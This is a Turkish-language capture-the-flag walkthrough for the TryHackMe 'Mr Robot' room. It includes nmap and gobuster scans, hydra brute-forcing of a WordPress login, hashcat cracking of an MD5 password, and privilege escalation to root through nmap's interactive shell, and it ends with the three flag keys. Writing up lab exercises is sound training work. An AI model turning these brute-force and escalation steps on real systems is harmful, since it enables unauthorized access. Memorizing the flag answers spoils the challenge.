@@ -1,0 +1,211 @@
+---
+title: "Mr Robot"
+description: " https://tryhackme.com/room/mrrobot"
+---
+
+<img
+  src="/images/mrrobot.svg"
+  alt="Mrrobot Sv"
+  title="Mrrobot Sv"
+  style={{ width:"20%" }}
+/>
+
+Öncelikle makineyi Nmap ile tarayıp açık portlarını görelim:
+
+<img
+  src="/images/image.png"
+  alt="image.png"
+  title="image.png"
+  style={{ width:"100%" }}
+/>
+
+```bash
+export IP=10.10.181.6
+```
+
+Böylece, makinede çalışan web ve ssh servislerini görebiliyoruz.  Makineyi daha detaylı incelediğimizde, robots.txt dosyasında tarayıcılar için gizli iki konum buluyoruz.
+
+```bash
+nmap -sS -sV -vv -Pn $IP
+PORT    STATE  SERVICE  REASON         VERSION
+22/tcp  closed ssh      reset ttl 61
+80/tcp  open   http     syn-ack ttl 61 Apache httpd
+443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
+```
+
+```bash
+gobuster dir -u http://10.10.108.126/ -w /usr/share/wordlists/dirb/common.txt
+```
+
+![image.png](/images/image.png)
+
+![Ekrangörüntüsü2025 09 02210745 Pn](/images/Ekrangörüntüsü2025-09-02210745.png)
+
+Bir sonraki adım bu bilgileri bir tarayıcıyla kontrol etmek olacak
+
+![Resim 2025 09 02 210933428 Pn](/images/resim_2025-09-02_210933428.png)
+
+![Resim 2025 09 02 211118538 Pn](/images/resim_2025-09-02_211118538.png)
+
+```
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+Ve işte ilk anahtarımız:
+
+![Resim 2025 09 02 211228270 Pn](/images/resim_2025-09-02_211228270.png)
+
+ şifrelenmiş bir parola olabilecek bir base64 dizesi buldum
+
+```bash
+hydra -L fsocity.dic -p test 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-29 20:50:41
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
+[DATA] attacking http-post-form://10.10.239.79:80/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username
+[80][http-post-form] host: 10.10.239.79   login: Elliot   password: test
+^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
+```
+
+Elliot
+
+```bash
+sort fsocity.dic | uniq > fsocity_sorted.dic
+
+##ve sonra
+
+hydra -l Elliot -P fsocity_sorted.dic 10.10.239.79 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"
+
+[80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
+```
+
+```bash
+python -c "import pty; pty.spawn('/bin/bash')"
+
+daemon@linux:/$ ls -la /home
+ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+daemon@linux:/$ ls -la /home/robot
+ls -la /home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+
+export TERM=xterm
+
+cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+hashcat -m 0 --force hash /usr/share/wordlists/rockyou.txt
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: The pocl project
+====================================
+* Device #1: pthread-Intel(R) Xeon(R) CPU E5-1650 v3 @ 3.50GHz, 512/1493 MB allocatable, 2MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+ATTENTION! Pure (unoptimized) OpenCL kernels selected.
+This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
+If you want to switch to optimized OpenCL kernels, append -O to your commandline.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=8 -D DEVICE_TYPE=2 -D DGST_R0=0 -D DGST_R1=3 -D DGST_R2=2 -D DGST_R3=1 -D DGST_ELEM=4 -D KERN_TYPE=0 -D _unroll'
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Type........: MD5
+Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
+Time.Started.....: Tue Sep 29 22:09:23 2020 (0 secs)
+Time.Estimated...: Tue Sep 29 22:09:23 2020 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   123.2 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+Progress.........: 40960/14344385 (0.29%)
+Rejected.........: 0/40960 (0.00%)
+Restore.Point....: 38912/14344385 (0.27%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: treetree -> loserface1
+
+Started: Tue Sep 29 22:09:15 2020
+Stopped: Tue Sep 29 22:09:24 2020
+
+## abcdefghijklmnopqrstuvwxyz
+```
+
+```bash
+daemon@linux:/home/robot$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ ls -la
+ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+```bash
+nmap --interactive
+
+nmap> !sh
+!sh
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls -l
+ls -l
+total 4
+-rw-r--r-- 1 root root  0 Nov 13  2015 firstboot_done
+-r-------- 1 root root 33 Nov 13  2015 key-3-of-3.txt
+# cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
+
+1. Key `073403c8a58a1f80d943455fb30724b9`
+2. Key `822c73956184f694993bede3eb39f959`
+3. Key `04787ddef27c3dee1ee161b21670b4e4`
+
+Haneye hayılrı olsun ustam\
+  
